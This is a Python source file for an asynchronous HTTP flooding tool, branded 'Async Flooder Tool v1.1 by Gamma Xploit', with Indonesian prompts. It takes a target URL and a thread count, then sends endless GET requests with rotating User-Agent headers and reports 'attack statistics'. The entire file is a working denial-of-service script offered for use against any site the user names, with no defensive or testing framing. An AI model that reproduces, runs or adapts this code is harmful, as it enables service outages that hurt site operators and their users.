import asyncio
import aiohttp
import random
import time
import os
from collections import Counter

# Warna ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

def banner(url, concurrency):
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{CYAN}
╔════════════════════════════════════════╗
║        Async Flooder Tool v1.1         ║
║        by   Gamma Xploit               ║
╚════════════════════════════════════════╝
Target   : {YELLOW}{url}{CYAN}
Threads  : {YELLOW}{concurrency}{RESET}
""")

async def send_request(session, url, stats):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        async with session.get(url, headers=headers, timeout=10) as response:
            status = response.status
            stats['success'] += 1 if status == 200 else 0
            stats['status_codes'][status] += 1
            print(f"{GREEN}Status Code: {status}{RESET}")
    except asyncio.TimeoutError:
        stats['timeout'] += 1
        print(f"{YELLOW}Timeout error{RESET}")
    except aiohttp.ClientError as e:
        stats['errors'] += 1
        print(f"{RED}Client error: {e}{RESET}")
    except Exception as e:
        stats['errors'] += 1
        print(f"{RED}Unexpected error: {e}{RESET}")

async def worker(session, url, stats):
    while True:
        await send_request(session, url, stats)

async def main(url, concurrency):
    connector = aiohttp.TCPConnector(limit=concurrency)
    stats = {
        'success': 0,
        'timeout': 0,
        'errors': 0,
        'status_codes': Counter()
    }
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session, url, stats)) for _ in range(concurrency)]
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            print(f"\n{CYAN}--- Statistik Serangan ---{RESET}")
            print(f"{GREEN}Sukses (200): {stats['success']}{RESET}")
            print(f"{YELLOW}Timeouts: {stats['timeout']}{RESET}")
            print(f"{RED}Errors: {stats['errors']}{RESET}")
            print(f"Status codes lain: {dict(stats['status_codes'])}")

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{CYAN}╔════════════════════════════════════════════╗")
    print(f"║         {YELLOW}ASYNC FLOODER TERMINAL TOOL{CYAN}        ║")
    print(f"╚════════════════════════════════════════════╝{RESET}\n")

    url = input(f"{YELLOW}[?] Masukkan target URL: {RESET}")
    try:
        concurrency = int(input(f"{YELLOW}[?] Masukkan jumlah threads: {RESET}"))
    except ValueError:
        print(f"{RED}[!] Jumlah threads harus berupa angka!{RESET}")
        exit()

    banner(url, concurrency)
    input(f"{YELLOW}[!] Tekan ENTER untuk memulai serangan...{RESET}\n")

    start = time.time()
    print(f"{CYAN}Menjalankan serangan... Tekan CTRL+C untuk menghentikan.{RESET}\n")
    try:
        asyncio.run(main(url, concurrency))
    except KeyboardInterrupt:
        end = time.time()
        print(f"\n{YELLOW}Dihentikan setelah {end - start:.2f} detik.{RESET}")